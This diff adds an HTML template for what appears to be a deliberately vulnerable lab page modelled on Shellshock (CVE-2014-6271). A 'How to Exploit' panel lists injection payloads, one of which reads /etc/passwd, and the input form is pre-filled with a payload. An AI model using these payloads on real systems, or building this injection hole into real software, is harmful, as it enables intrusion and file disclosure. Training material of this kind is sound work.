@@ -1,0 +1,21 @@
+{% extends 'base.html' %}
+{% block title %}Env Check (CVE-2014-6271 / Shellshock Analog){% endblock %}
+{% block content %}
+<div class="pagehead">
+  <h1>Environment Diagnostics</h1>
+  <p>Check an environment variable value · <span class="badge warn">CVE-2014-6271 (Shellshock) analog</span></p>
+</div>
+<div class="panel">
+  <h2>How to <span>Exploit</span></h2>
+  <pre class="code">env_val=() { ignored; }; __import__('os').getcwd()
+env_val=() { ignored; }; open('/etc/passwd').read()[:200]</pre>
+</div>
+<div class="panel">
+  <form method="POST">
+    <label>Environment Value</label>
+    <input type="text" name="env_val" placeholder="() { ignored; }; __import__('os').getcwd()" value="{{ val }}">
+    <button class="btn" type="submit">Check</button>
+  </form>
+  {% if result is not none %}<pre class="code" style="margin-top:14px;">{{ result }}</pre>{% endif %}
+</div>
+{% endblock %}
